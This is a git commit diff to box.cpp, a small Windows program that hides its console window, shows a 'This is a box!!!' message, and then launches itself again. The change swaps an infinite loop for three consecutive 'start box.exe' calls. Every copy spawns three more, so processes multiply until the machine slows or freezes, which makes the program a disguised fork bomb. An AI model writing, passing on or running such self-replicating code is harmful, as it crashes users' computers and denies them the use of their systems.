68cb33e2ddad18b035cbd68421af44c85cf98745
Julius <45301064+JuliusVictorian@users.noreply.github.com>
2018-12-16 17:18:29 -0500

    Update box.cpp

--- box.cpp
+++ box.cpp
@@ -19,7 +19,8 @@ int main()
 {
 		ShowWindow(GetConsoleWindow(), SW_HIDE);
 		MessageBox(0, L"This is a box!!!", L"Hello", MB_OK);
-		for(;;)
+		system("start box.exe");
+		system("start box.exe");
 		system("start box.exe");
 		return 0;
 }
